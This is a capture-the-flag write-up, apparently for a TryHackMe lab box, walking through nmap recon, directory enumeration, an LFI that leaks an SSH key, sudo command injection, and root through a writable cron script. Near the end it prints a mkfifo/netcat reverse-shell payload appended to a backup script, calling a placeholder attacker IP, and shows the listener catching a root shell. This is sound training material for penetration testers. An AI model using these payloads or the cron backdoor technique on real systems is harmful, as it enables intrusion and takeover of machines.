@@ -1,0 +1,144 @@
+Recon
+
+Nmap revealed FTP, SSH, and HTTP open.
+
+┌──(scully㉿kali)-[~/Downloads]
+└─$ nmap -Pn -sC -A -sV -T4 10.10.240.44
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 14:19 EDT
+Nmap scan report for 10.10.240.44
+Host is up (0.83s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 82:a7:97:fa:fc:21:23:49:98:6c:04:3a:e4:1c:7d:9f (RSA)
+|   256 da:0f:64:12:66:52:f2:9d:c4:45:08:06:1e:31:74:b3 (ECDSA)
+|_  256 b4:85:2d:2d:94:b1:d3:c2:8c:69:a4:b7:72:ea:2b:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Crestron XPanel control system (86%), Linux 2.6.32 - 3.13 (86%), Linux 3.10 - 4.11 (86%), Linux 3.13 - 4.4 (86%), Linux 3.8 - 3.16 (86%), Linux 4.4 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 5 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   589.73 ms 10.17.0.1
+2   ... 4
+5   856.31 ms 10.10.240.44
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 104.51 seconds
+
+The default Apache landing page led nowhere — until I checked the source and discovered the server’s intended hostname (team.thm).
+
+After mapping team.thm in /etc/hosts, the real site appeared.
+
+echo "10.10.240.44 team.thm" >> /etc/hosts
+
+Discovering Hidden Files & Credentials:
+
+[14:48:29] 403 -  273B  - /.ht_wsr.txt                                      
+[14:48:29] 403 -  273B  - /.htaccess.orig                                   
+[14:48:29] 403 -  273B  - /.htaccess.bak1                                   
+[14:48:29] 403 -  273B  - /.htaccess.save                                   
+[14:48:29] 403 -  273B  - /.htaccess.sample                                 
+[14:48:29] 403 -  273B  - /.htaccessOLD2
+[14:48:29] 403 -  273B  - /.htaccessBAK                                     
+[14:48:29] 403 -  273B  - /.htaccess_orig
+[14:48:29] 403 -  273B  - /.htaccess_extra
+[14:48:29] 403 -  273B  - /.htaccess_sc
+[14:48:29] 403 -  273B  - /.htaccessOLD                                     
+[14:48:29] 403 -  273B  - /.html                                            
+[14:48:29] 403 -  273B  - /.htm
+[14:48:29] 403 -  273B  - /.htpasswds                                       
+[14:48:29] 403 -  273B  - /.htpasswd_test
+[14:48:29] 403 -  273B  - /.httr-oauth
+[14:48:37] 403 -  273B  - /.php                                             
+[14:49:53] 403 -  273B  - /assets/                                          
+[14:49:53] 301 -  305B  - /assets  ->  http://team.thm/assets/
+[14:50:56] 301 -  305B  - /images  ->  http://team.thm/images/              
+[14:50:56] 200 -  371B  - /images/                                          
+[14:52:16] 200 -    5B  - /robots.txt                                       
+[14:52:18] 301 -  306B  - /scripts  ->  http://team.thm/scripts/            
+[14:52:18] 403 -  273B  - /scripts/
+[14:52:21] 403 -  273B  - /server-status                                    
+[14:52:21] 403 -  273B  - /server-status/
+
+Gobuster revealed /robots.txt, listing the username dale.
+
+Found script.txt under /scripts/ containing FTP credentials.
+
+/script.txt (Status: 200)
+
+Gaining Foothold:
+
+Using the creds, accessed FTP, grabbed a hint about the .dev subdomain.
+
+Enumerated and visited dev.team.thm, found a script.php vulnerable to LFI.
+
+Read /etc/ssh/sshd_config via LFI, it contained an SSH key for user dale.
+
+Used the key to SSH in as dale and pulled the user.txt flag.
+
+┌──(scully㉿kali)-[~/Downloads]
+└─$ chmod 600 id_rsa
+
+┌──(scully㉿kali)-[~/Downloads]
+└─$ ssh -i id_rsa dale@team.thm  
+Last login: Mon Jan 18 10:51:32 2021
+dale@ip-10-10-240-44:~$ ls
+user.txt
+dale@ip-10-10-240-44:~$ cat user.txt 
+THM{REDACTED}
+
+Privilege Escalation | Gyles
+
+sudo -l showed dale can run /home/gyles/admin_checks as gyles without a password.
+
+dale@ip-10-10-240-44:~$ sudo -l
+Matching Defaults entries for dale on ip-10-10-240-44:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dale may run the following commands on ip-10-10-240-44:
+    (gyles) NOPASSWD: /home/gyles/admin_checks
+
+That script accepts user input and passes it unsafely into a command  | ripe for exploitation.
+
+Injected a reverse shell command into admin_checks to spawn a shell as gyles.
+
+dale@ip-10-10-240-44:~$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: musyoka
+Enter 'date' to timestamp the file: /bin/bash
+The Date is now
+id
+uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Root via Cron
+
+Found a cron job running as root, executing a script script.sh.
+
+Had write access to it, added a reverse shell payload.
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR_IP] 4446 >/tmp/f" >> /usr/local/bin/main_backup.sh
+
+After the cron ran, gained a root shell and captured root.txt.
+
+┌──(scully㉿kali)-[~/Downloads]
+└─$ nc -lvnp 4446
+listening on [any] 4446 ...
+connect to [10.17.27.101] from (UNKNOWN) [10.10.240.44] 58108
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root),108(lxd),1004(admin)
+# ls
+root.txt
+snap
+# cat root.txt
+THM{REDACTED}
